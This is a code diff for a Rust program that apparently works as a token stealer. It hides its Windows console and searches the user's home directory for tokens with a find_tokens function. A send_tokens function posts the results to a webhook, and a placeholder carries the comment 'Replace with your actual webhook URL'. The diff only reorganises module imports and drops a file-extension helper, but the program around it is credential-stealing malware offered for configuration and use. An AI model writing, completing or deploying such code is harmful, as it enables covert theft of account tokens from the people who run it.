@@ -1,14 +1,14 @@
 #![windows_subsystem = "windows"]
 
 mod read;
-use read::read::read_lines;
+mod find;
+
+use find::finder::find_tokens;
 
 #[tokio::main]
 async fn main() {
-    mod find;
-    use find::finder::find_tokens;
     use dirs::home_dir;
-    let url = "Webhook Url Here";
+    let url = "Webhook Url Here"; // Replace with your actual webhook URL
     let home_dir = home_dir().unwrap();
     let home_str = home_dir.to_string_lossy();
     let mut paths: Vec<String> = Vec::new();
@@ -46,10 +46,4 @@ async fn send_tokens(url: &str, tokens: Vec<String>) {
             .await
             .unwrap();
     }
-}
-
-fn get_extension(filename: &str) -> Option<&str> {
-    use std::ffi::OsStr;
-    use std::path::Path;
-    Path::new(filename).extension().and_then(OsStr::to_str)
 }
